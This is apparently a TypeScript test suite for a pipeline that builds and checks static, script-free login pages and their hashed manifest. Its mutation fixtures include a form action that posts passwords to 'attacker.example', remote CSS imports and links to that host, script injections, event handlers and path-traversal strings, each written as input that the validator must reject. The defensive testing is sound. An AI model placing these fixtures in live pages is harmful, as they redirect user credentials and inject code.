import { afterEach, describe, expect, it } from "bun:test";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  createLoginArtifactEntry,
  createLoginManifest,
  type LoginArtifactLogicalName,
  type LoginArtifactManifest,
  LOGIN_ARTIFACT_SCHEMA_VERSION,
  LOGIN_HTML_PATHS,
  LOGIN_MANIFEST_FILENAME,
  MAX_LOGIN_STYLESHEET_BYTES,
  renderLoginDocument,
  serializeLoginManifest,
  sha256Hex,
  validateLoginDocument,
  validateLoginManifest,
  verifyLoginArtifactDirectory,
} from "../scripts/login-artifacts";
import { buildLoginArtifacts } from "../scripts/build-login";
import { LOGIN_ERROR_MESSAGES, LOGIN_VARIANTS } from "./LoginPage";

const STYLESHEET_PATH = "assets/login-AbCd1234.css";
const STYLESHEET = ".login { color: currentColor; }\n";

const temporaryRoots = new Set<string>();

afterEach(() => {
  for (const root of temporaryRoots) rmSync(root, { force: true, recursive: true });
  temporaryRoots.clear();
});

function makeTemporaryRoot(prefix = "auggy-login-artifacts-"): string {
  const root = mkdtempSync(join(tmpdir(), prefix));
  temporaryRoots.add(root);
  return root;
}

function makeManifest(stylesheetPath = STYLESHEET_PATH): LoginArtifactManifest {
  return createLoginManifest([
    createLoginArtifactEntry("stylesheet", stylesheetPath, STYLESHEET),
    ...LOGIN_VARIANTS.map((variant) =>
      createLoginArtifactEntry(
        variant,
        LOGIN_HTML_PATHS[variant],
        renderLoginDocument(variant, stylesheetPath),
      ),
    ),
  ]);
}

function writeBundle(root: string, manifest = makeManifest()): void {
  for (const entry of manifest.artifacts) {
    const path = join(root, ...entry.path.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    const content =
      entry.logicalName === "stylesheet"
        ? STYLESHEET
        : renderLoginDocument(
            entry.logicalName,
            manifest.artifacts.find((candidate) => candidate.logicalName === "stylesheet")!.path,
          );
    writeFileSync(path, content);
  }
  writeFileSync(join(root, LOGIN_MANIFEST_FILENAME), serializeLoginManifest(manifest));
}

function cloneManifest(manifest: LoginArtifactManifest): LoginArtifactManifest {
  return structuredClone(manifest);
}

function fileDigestInventory(root: string, prefix = ""): Record<string, string> {
  const inventory: Record<string, string> = {};
  for (const entry of readdirSync(root, { withFileTypes: true })) {
    const path = prefix ? `${prefix}/${entry.name}` : entry.name;
    const absolutePath = join(root, entry.name);
    if (entry.isDirectory()) Object.assign(inventory, fileDigestInventory(absolutePath, path));
    else inventory[path] = sha256Hex(readFileSync(absolutePath));
  }
  return Object.fromEntries(
    Object.entries(inventory).sort(([left], [right]) => left.localeCompare(right)),
  );
}

function resignArtifact(
  root: string,
  logicalName: LoginArtifactLogicalName,
  content: string,
): void {
  const manifest = JSON.parse(
    readFileSync(join(root, LOGIN_MANIFEST_FILENAME), "utf8"),
  ) as LoginArtifactManifest;
  const entry = manifest.artifacts.find((candidate) => candidate.logicalName === logicalName);
  if (!entry) throw new Error(`missing fixture entry: ${logicalName}`);
  writeFileSync(join(root, ...entry.path.split("/")), content);
  const bytes = Buffer.from(content, "utf8");
  entry.size = bytes.byteLength;
  entry.sha256 = sha256Hex(bytes);
  writeFileSync(join(root, LOGIN_MANIFEST_FILENAME), serializeLoginManifest(manifest));
}

describe("login document artifacts", () => {
  it.each(LOGIN_VARIANTS.map((variant) => [variant] as const))(
    "renders a deterministic, complete %s document",
    (variant) => {
      const first = renderLoginDocument(variant, STYLESHEET_PATH);
      const second = renderLoginDocument(variant, STYLESHEET_PATH);

      expect(second).toBe(first);
      expect(first).toStartWith("<!doctype html>");
      expect(first).toContain('<html lang="en"');
      expect(first).toContain('<meta name="robots" content="noindex, nofollow">');
      expect(first).toContain('<form class="space-y-4" method="post">');
      expect(first).toContain('<label for="password"');
      expect(first).toContain('id="password"');
      expect(first).toContain('name="password"');
      expect(first).toContain('type="password"');
      expect(first).toContain('autoComplete="current-password"');
      expect(first).toContain('required=""');
      expect(first).toContain('<button type="submit"');
      expect(first).toContain(`data-auggy-login-variant="${variant}"`);
      expect(first).toContain(`href="/console/login-assets/${STYLESHEET_PATH}"`);
      expect(first.match(/<form\b/g)).toHaveLength(1);
      expect(first).not.toMatch(/<script\b|\son[a-z]+\s*=|\saction\s*=|\svalue\s*=/i);
      expect(first).not.toMatch(/file:\/\/|\/Users\/|\/private\/|[A-Za-z]:\\/);

      const expectedError = LOGIN_ERROR_MESSAGES[variant];
      expect(first.match(/role="alert"/g) ?? []).toHaveLength(expectedError ? 1 : 0);
      expect(first.includes('aria-describedby="login-error"')).toBe(Boolean(expectedError));
      for (const message of Object.values(LOGIN_ERROR_MESSAGES)) {
        expect(first.includes(message)).toBe(message === expectedError);
      }
    },
  );

  it.each([
    "login.css",
    "/assets/login-AbCd1234.css",
    "assets/../login-AbCd1234.css",
    "assets\\login-AbCd1234.css",
    "assets/login-AbCd1234.css?cache=1",
    "assets/login-AbCd1234.js",
  ])("rejects unsafe or non-fingerprinted stylesheet path %s", (path) => {
    expect(() => renderLoginDocument("default", path)).toThrow();
  });

  it.each([
    [
      "a form action",
      (document: string) =>
        document.replace('method="post"', 'method="post" action="https://attacker.example"'),
    ],
    [
      "a second form",
      (document: string) => document.replace("</body>", '<form method="post"></form></body>'),
    ],
    [
      "a script",
      (document: string) => document.replace("</body>", "<script>alert(1)</script></body>"),
    ],
    [
      "an inline style element",
      (document: string) => document.replace("</body>", "<style>body{display:none}</style></body>"),
    ],
    [
      "an inline style attribute",
      (document: string) => document.replace("<body", '<body style="display:none"'),
    ],
    [
      "a remote resource",
      (document: string) =>
        document.replace(
          "</head>",
          '<link rel="preload" href="https://attacker.example/x"></head>',
        ),
    ],
    [
      "an extra local stylesheet",
      (document: string) =>
        document.replace(
          "</head>",
          '<link rel="stylesheet" href="/console/assets/main.css"></head>',
        ),
    ],
    [
      "a protocol-relative resource",
      (document: string) =>
        document.replace("</head>", '<link rel="preconnect" href="//attacker.example"></head>'),
    ],
    [
      "an inline event handler",
      (document: string) => document.replace("<body", '<body onload="alert(1)"'),
    ],
    [
      "an input value",
      (document: string) => document.replace('name="password"', 'name="password" value="secret"'),
    ],
    [
      "an unresolved placeholder",
      (document: string) => document.replace("</body>", "__ACTION_PLACEHOLDER__</body>"),
    ],
    [
      "a local path",
      (document: string) => document.replace("</body>", "/Users/operator/project</body>"),
    ],
    [
      "a mismatched variant",
      (document: string) =>
        document.replace(
          'data-auggy-login-variant="default"',
          'data-auggy-login-variant="invalid-password"',
        ),
    ],
    [
      "a mismatched stylesheet",
      (document: string) => document.replace(STYLESHEET_PATH, "assets/login-Other123.css"),
    ],
  ] as const)("rejects a generated document containing %s", (_label, mutate) => {
    const document = renderLoginDocument("default", STYLESHEET_PATH);
    expect(() => validateLoginDocument(mutate(document), "default", STYLESHEET_PATH)).toThrow();
  });

  it.each([
    ["label", (document: string) => document.replace(/<label\b[^>]*>.*?<\/label>/, "")],
    ["required", (document: string) => document.replace(' required=""', "")],
    [
      "autocomplete",
      (document: string) => document.replace(' autoComplete="current-password"', ""),
    ],
    ["submit control", (document: string) => document.replace('type="submit"', 'type="button"')],
  ] as const)("rejects a generated document missing its native %s contract", (_label, mutate) => {
    const document = renderLoginDocument("default", STYLESHEET_PATH);
    expect(() => validateLoginDocument(mutate(document), "default", STYLESHEET_PATH)).toThrow();
  });

  it("binds each fixed error alert to the password control", () => {
    for (const variant of ["invalid-password", "invalid-ticket"] as const) {
      const document = renderLoginDocument(variant, STYLESHEET_PATH);

      expect(document).toContain('id="login-error"');
      expect(document).toContain('aria-describedby="login-error"');
      expect(() =>
        validateLoginDocument(
          document.replace(' aria-describedby="login-error"', ""),
          variant,
          STYLESHEET_PATH,
        ),
      ).toThrow();
      expect(() =>
        validateLoginDocument(
          document.replace('id="login-error"', 'id="different-error"'),
          variant,
          STYLESHEET_PATH,
        ),
      ).toThrow();
    }
  });

  it("rejects a stray error association on the default variant", () => {
    const document = renderLoginDocument("default", STYLESHEET_PATH);
    const mutated = document.replace(
      'name="password"',
      'name="password" aria-describedby="login-error"',
    );

    expect(() => validateLoginDocument(mutated, "default", STYLESHEET_PATH)).toThrow();
  });
});

describe("login artifact manifest", () => {
  it("creates the exact path-sorted logical inventory with byte metadata", () => {
    const manifest = makeManifest();

    expect(manifest.schemaVersion).toBe(LOGIN_ARTIFACT_SCHEMA_VERSION);
    expect(manifest.artifacts.map((entry) => entry.path)).toEqual([
      "assets/login-AbCd1234.css",
      "default.html",
      "invalid-password.html",
      "invalid-ticket.html",
    ]);
    expect(new Set(manifest.artifacts.map((entry) => entry.logicalName))).toEqual(
      new Set(["default", "invalid-password", "invalid-ticket", "stylesheet"]),
    );
    for (const entry of manifest.artifacts) {
      expect(entry.size).toBeGreaterThan(0);
      expect(entry.sha256).toMatch(/^[a-f0-9]{64}$/);
      expect(entry.mediaType).toBe(entry.logicalName === "stylesheet" ? "text/css" : "text/html");
    }
    expect(() => validateLoginManifest(manifest)).not.toThrow();
  });

  it("canonicalizes serialization independent of caller object key insertion order", () => {
    const manifest = makeManifest();
    const reordered: LoginArtifactManifest = {
      artifacts: manifest.artifacts.map((entry) => ({
        sha256: entry.sha256,
        size: entry.size,
        path: entry.path,
        mediaType: entry.mediaType,
        logicalName: entry.logicalName,
      })),
      schemaVersion: manifest.schemaVersion,
    };

    expect(serializeLoginManifest(reordered)).toBe(serializeLoginManifest(manifest));
    expect(serializeLoginManifest(manifest)).toBe(serializeLoginManifest(manifest));
    expect(serializeLoginManifest(manifest)).toEndWith("\n");
  });

  it.each([
    [
      "top-level field",
      (manifest: LoginArtifactManifest) => Object.assign(manifest, { generatedAt: "now" }),
    ],
    [
      "entry field",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[0]!, { source: "/tmp/login.css" }),
    ],
    ["schema", (manifest: LoginArtifactManifest) => Object.assign(manifest, { schemaVersion: 2 })],
    ["missing logical entry", (manifest: LoginArtifactManifest) => manifest.artifacts.pop()],
    [
      "unknown logical entry",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[0]!, { logicalName: "javascript" }),
    ],
    [
      "duplicate logical entry",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[1]!, { logicalName: manifest.artifacts[0]!.logicalName }),
    ],
    [
      "duplicate path",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[1]!, { path: manifest.artifacts[0]!.path }),
    ],
    ["unsorted paths", (manifest: LoginArtifactManifest) => manifest.artifacts.reverse()],
    [
      "wrong media type",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[0]!, { mediaType: "text/javascript" }),
    ],
    [
      "zero size",
      (manifest: LoginArtifactManifest) => Object.assign(manifest.artifacts[0]!, { size: 0 }),
    ],
    [
      "fractional size",
      (manifest: LoginArtifactManifest) => Object.assign(manifest.artifacts[0]!, { size: 1.5 }),
    ],
    [
      "oversized stylesheet",
      (manifest: LoginArtifactManifest) =>
        Object.assign(
          manifest.artifacts.find((entry) => entry.logicalName === "stylesheet")!,
          { size: MAX_LOGIN_STYLESHEET_BYTES + 1 },
        ),
    ],
    [
      "uppercase digest",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[0]!, { sha256: "A".repeat(64) }),
    ],
    [
      "short digest",
      (manifest: LoginArtifactManifest) =>
        Object.assign(manifest.artifacts[0]!, { sha256: "a".repeat(63) }),
    ],
  ] as const)("rejects a manifest with an invalid %s", (_label, mutate) => {
    const manifest = cloneManifest(makeManifest());
    mutate(manifest);
    expect(() => validateLoginManifest(manifest)).toThrow();
  });

  it.each([
    "/assets/login-AbCd1234.css",
    "../assets/login-AbCd1234.css",
    "assets/../login-AbCd1234.css",
    "assets//login-AbCd1234.css",
    "assets\\login-AbCd1234.css",
    "assets/%2e%2e/login-AbCd1234.css",
    "assets/login-AbCd1234.css%00",
    "assets/login.css",
    "assets/login-AbCd1234.js",
  ])("rejects unsafe stylesheet artifact path %s", (path) => {
    const entries = makeManifest().artifacts.map((entry) =>
      entry.logicalName === "stylesheet" ? { ...entry, path } : entry,
    );
    expect(() => createLoginManifest(entries)).toThrow();
  });
});

describe("login artifact build", () => {
  it("rebuilds the exact no-JavaScript inventory deterministically and removes stale output", async () => {
    const root = makeTemporaryRoot("auggy-login-build-");
    const destination = join(root, "login");

    await buildLoginArtifacts({ destination });
    const first = fileDigestInventory(destination);
    const paths = Object.keys(first);
    expect(paths).toHaveLength(5);
    expect(paths[0]).toMatch(/^assets\/login-[A-Za-z0-9_-]{6,64}\.css$/);
    expect(paths.slice(1)).toEqual([
      "default.html",
      "invalid-password.html",
      "invalid-ticket.html",
      "manifest.json",
    ]);
    expect(Object.keys(first).some((path) => /\.(?:js|map)$/.test(path))).toBeFalse();
    const stylesheetPath = paths[0];
    if (!stylesheetPath) throw new Error("login build did not emit a stylesheet");
    const stylesheetBytes = readFileSync(join(destination, ...stylesheetPath.split("/")));
    const stylesheet = stylesheetBytes.toString("utf8");
    expect(stylesheetBytes.byteLength).toBeLessThan(40 * 1024);
    for (const unrelatedSelector of [".animate-spin", ".grid-cols-3", ".overflow-x-auto"]) {
      expect(stylesheet).not.toContain(unrelatedSelector);
    }
    expect(() => verifyLoginArtifactDirectory(destination)).not.toThrow();

    writeFileSync(join(destination, "stale.js"), "alert(1)");
    await buildLoginArtifacts({ destination });
    const second = fileDigestInventory(destination);
    expect(second).toEqual(first);
    expect(() => verifyLoginArtifactDirectory(destination)).not.toThrow();
  });
});

describe("login artifact directory verification", () => {
  it("accepts only a complete, self-consistent generated directory", () => {
    const root = makeTemporaryRoot();
    const manifest = makeManifest();
    writeBundle(root, manifest);

    expect(verifyLoginArtifactDirectory(root)).toEqual(manifest);
  });

  it("rejects a missing allowlisted file", () => {
    const root = makeTemporaryRoot();
    const manifest = makeManifest();
    writeBundle(root, manifest);
    unlinkSync(join(root, LOGIN_HTML_PATHS.default));

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it("rejects an unexpected file", () => {
    const root = makeTemporaryRoot();
    writeBundle(root);
    writeFileSync(join(root, "unexpected.js"), "alert(1)");

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it("rejects an artifact whose bytes no longer match its size and digest", () => {
    const root = makeTemporaryRoot();
    writeBundle(root);
    writeFileSync(join(root, LOGIN_HTML_PATHS.default), "tampered");

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it.each([
    [
      "script markup",
      (document: string) => document.replace("</body>", "<script>alert(1)</script></body>"),
    ],
    ["the wrong fixed variant", () => renderLoginDocument("invalid-password", STYLESHEET_PATH)],
    [
      "a local build path",
      (document: string) => document.replace("</body>", "/private/tmp/build</body>"),
    ],
  ] as const)("rejects re-signed HTML containing %s", (_label, mutate) => {
    const root = makeTemporaryRoot();
    writeBundle(root);
    const document = readFileSync(join(root, LOGIN_HTML_PATHS.default), "utf8");
    resignArtifact(root, "default", mutate(document));

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it.each([
    "/*# sourceMappingURL=login.css.map */",
    "<script>alert(1)</script>",
    '@import url("https://attacker.example/x.css");',
    '.x{background-image:url("https://attacker.example/x.png")}',
    ".x{background-image:URL(data:image/svg+xml;base64,AAAA)}",
  ])("rejects re-signed CSS containing forbidden output: %s", (forbidden) => {
    const root = makeTemporaryRoot();
    writeBundle(root);
    resignArtifact(root, "stylesheet", `${STYLESHEET}${forbidden}`);

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it("rejects a symlink anywhere inside the artifact inventory", () => {
    const root = makeTemporaryRoot();
    const outside = makeTemporaryRoot("auggy-login-outside-");
    writeBundle(root);
    writeFileSync(join(outside, "outside.css"), STYLESHEET);
    const stylesheet = join(root, ...STYLESHEET_PATH.split("/"));
    unlinkSync(stylesheet);
    symlinkSync(join(outside, "outside.css"), stylesheet);

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });

  it("rejects a symlink used as the artifact root", () => {
    const root = makeTemporaryRoot();
    const parent = makeTemporaryRoot("auggy-login-root-link-");
    writeBundle(root);
    const link = join(parent, "login");
    symlinkSync(root, link, "dir");

    expect(() => verifyLoginArtifactDirectory(link)).toThrow();
  });

  it("rejects malformed or oversized manifest bytes", () => {
    const root = makeTemporaryRoot();
    writeBundle(root);
    writeFileSync(join(root, LOGIN_MANIFEST_FILENAME), "{".repeat(65 * 1024));

    expect(() => verifyLoginArtifactDirectory(root)).toThrow();
  });
});
